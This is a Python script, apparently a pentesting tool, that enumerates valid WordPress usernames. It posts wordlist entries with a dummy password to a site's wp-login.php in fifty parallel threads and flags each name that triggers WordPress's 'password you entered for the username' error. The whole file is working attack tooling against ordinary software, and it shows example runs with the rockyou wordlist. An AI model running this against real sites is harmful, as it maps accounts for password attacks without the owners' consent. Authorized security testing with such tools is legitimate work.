#!/usr/bin/python3 

import requests, sys 
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from pwn import *

# WORDPRESS USER ENUM
# [*] Use:  wp-user-enum <WORDLIST> <URL>
# By: Diego Osorio (alias sha-16) 



def banner():
    print(colored(
"""
 __      ___ __        _   _ ___  ___ _ __       ___ _ __  _   _ _ __ ___  
 \ \ /\ / / '_ \ _____| | | / __|/ _ \ '__|____ / _ \ '_ \| | | | '_ ` _ \ 
  \ V  V /| |_) |_____| |_| \__ \  __/ | |_____|  __/ | | | |_| | | | | | | 
   \_/\_/ | .__/       \__,_|___/\___|_|        \___|_| |_|\__,_|_| |_| |_| (by sha-16)
          |_|                                                              
""", 'blue'))

##########################################################################################

def check_target(target):
    try: 
        requests.get(target, timeout=5)
        return True
    except:
        return False 

def check_wordlist(dic):
    try:
        with open(dic, 'r') as dictionary:
            return True
    except: 
        return False    
    
##########################################################################################


def makeRequests(user): 

    data = {
        "log": user,
        "pwd": "random_string",
        "wp-submit": "Log In"
    }

    try:
        r = requests.post(url, data=data)

        user_to_test.status(user)
        
        if "The password you entered for the username" in r.text:
            print(colored(f"* {user}", 'green')) 
            
    except:
        pass

        
##########################################################################################

if __name__ == '__main__':

    banner()
    
    if len(sys.argv) == 3:     
    
        dic = sys.argv[1]    
        url = sys.argv[2]

        if check_target(url) and check_wordlist(dic):
            with open(dic, "r") as wordlist:     

                dictionary = []
                for word in wordlist:  
                    dictionary.append(word.rstrip())


                log.progress('Starting user enumeration...')
                
                print(colored("-"*70, 'red'))
                print(colored("[+]", 'blue') +  f" Url: {url}")
                print(colored("[+]", 'blue') + f" Dictionary: {dic}")
                print(colored("-"*70, 'red'))

                with ThreadPoolExecutor(max_workers=50) as executor: 
                    user_to_test =  log.progress('Testing')
                    results = executor.map(makeRequests, dictionary)
    
                print(colored("-"*70, 'red'))
                print("Finished...!")
                print(colored("-"*70, 'red'))
                sys.exit(0)

                
        else: 
            print("[!] ERROR: Something was wrong with your dictionary or your target...!")
            sys.exit(2)        


    else: 
        print("-"*70)
        print(f"[*] USE: wp-user-enum.py <USER-WORLDIST> <WP-URL>")
        print("-"*70)
        print("\n~ EXAMPLE: ")
        print(f"\n$ wp-user-enum.py users.txt http://wp-website.com/wp-login.php")
        print(f"$ wp-user-enum.py /usr/share/worldlists/rockyou.txt http://wp-website.com/wordpress/wp-login.php\n")

##########################################################################################
